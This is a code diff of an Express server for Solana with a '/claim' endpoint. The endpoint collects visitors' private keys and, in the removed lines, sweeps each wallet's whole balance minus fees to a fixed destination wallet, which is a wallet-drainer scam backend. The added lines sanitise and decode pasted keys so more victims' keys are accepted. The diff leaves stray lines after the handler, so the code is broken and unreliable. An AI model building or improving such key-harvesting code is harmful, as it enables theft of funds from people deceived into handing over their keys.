@@ -15,32 +15,34 @@ const connection = new Connection(RPC_URL);
 
 // 1. THE CLAIM ENDPOINT (With detailed error catching)
 app.post('/claim', async (req, res) => {
-    const { privateKey } = req.body;
-
-    if (!privateKey || !DESTINATION_WALLET) {
-        return res.status(400).json({ success: false, error: "Missing private key or destination wallet" });
-    }
-
     try {
-        const keyPair = Keypair.fromSecretKey(bs58.decode(privateKey));
-        const destinationPubKey = new PublicKey(DESTINATION_WALLET);
-        
-        const balance = await connection.getBalance(keyPair.publicKey);
-        const feeLimit = 5000; // 0.000005 SOL
-        const amountToSend = balance - feeLimit;
+        let { privateKey } = req.body;
 
-        if (amountToSend <= 0) {
-            return res.status(400).json({ success: false, error: "Insufficient balance to cover gas fees" });
+        if (!privateKey) {
+            return res.status(400).json({ error: "Private key is required" });
         }
 
-        const transaction = new Transaction().add(
-            SystemProgram.transfer({
-                fromPubkey: keyPair.publicKey,
-                toPubkey: destinationPubKey,
-                lamports: amountToSend,
-            })
-        );
+        // 1. SANITIZE: Remove whitespace, quotes, or brackets if they pasted a JSON array
+        privateKey = privateKey.trim().replace(/["'\[\]]/g, '');
 
+        let secretKey;
+        try {
+            // 2. ATTEMPT DECODE: This is where the "Non-base58 character" error happens
+            secretKey = bs58.decode(privateKey);
+        } catch (decodeError) {
+            console.error("💥 Decode Error:", decodeError.message);
+            return res.status(400).json({ 
+                error: "Invalid private key format. Please ensure you are using a Base58 encoded key, not a seed phrase." 
+            });
+        }
+
+        // ... rest of your transaction logic (Keypair.fromSecretKey, etc.)
+        
+    } catch (globalError) {
+        console.error("💥 Transfer Error:", globalError.message);
+        res.status(500).json({ error: "Transaction failed" });
+    }
+});
         // Execute and confirm
         const signature = await sendAndConfirmTransaction(connection, transaction, [keyPair]);
         
